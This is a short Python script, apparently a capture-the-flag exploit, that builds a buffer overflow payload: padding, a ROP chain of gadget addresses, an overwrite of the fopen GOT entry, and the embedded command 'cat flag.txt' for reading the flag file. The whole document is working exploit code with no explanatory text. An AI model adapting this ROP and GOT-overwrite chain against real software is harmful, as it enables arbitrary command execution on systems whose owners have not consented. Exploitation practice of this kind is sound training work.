import struct

g1 = 0x4006d0

fopen_addr = 0x400530
fopen_got_addr = 0x601040

got_offset = 170208

payload = 'A' * 1032
payload += struct.pack('<Q', g1+1)
payload += struct.pack('<Q', fopen_got_addr-16)
payload += struct.pack('<Q', g1+10)
payload += struct.pack('<Q', got_offset)
payload += struct.pack('<Q', g1+1)
payload += struct.pack('<Q', 0x18)
payload += struct.pack('<Q', g1+3)
payload += 'cat flag.txt' + '\x00' * 12
payload += struct.pack('<Q', g1)
payload += struct.pack('<Q', fopen_addr)

print payload
